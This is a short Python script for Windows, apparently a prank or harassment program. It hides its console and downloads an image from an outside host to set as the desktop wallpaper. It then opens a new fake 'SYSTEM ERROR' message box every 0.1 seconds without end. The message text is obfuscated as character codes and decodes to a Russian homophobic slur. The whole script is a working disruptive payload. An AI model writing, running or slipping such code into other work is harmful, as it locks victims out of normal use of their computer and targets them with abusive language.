import ctypes
import threading
import time
import os
import urllib.request

word = chr(1089)+chr(1080)+chr(1087)+chr(1077)+chr(1089)+chr(1090)+chr(1072)+chr(1090)+' '+chr(1087)+chr(1080)+chr(1076)+chr(1088)
running = True

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

url = "https://i.ibb.co/TMWd9kH5/photo-2024-03-24-02-44-49.jpg"
img_path = os.path.join(os.environ['TEMP'], 'img.jpg')
urllib.request.urlretrieve(url, img_path)

def show_img():
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
        ctypes.windll.user32.MessageBoxTimeoutW(0, word, 'ОШИБКА СИСТЕМЫ', 0x10, 0, 0)
    except:
        pass

def show():
    try:
        ctypes.windll.user32.MessageBoxTimeoutW(0, word, 'ОШИБКА СИСТЕМЫ', 0x10, 0, 0)
    except:
        pass

def loop():
    show_img()
    while running:
        threading.Thread(target=show).start()
        time.sleep(0.1)

threading.Thread(target=loop).start()
try:
    while 1: time.sleep(1)
except:
    running = False
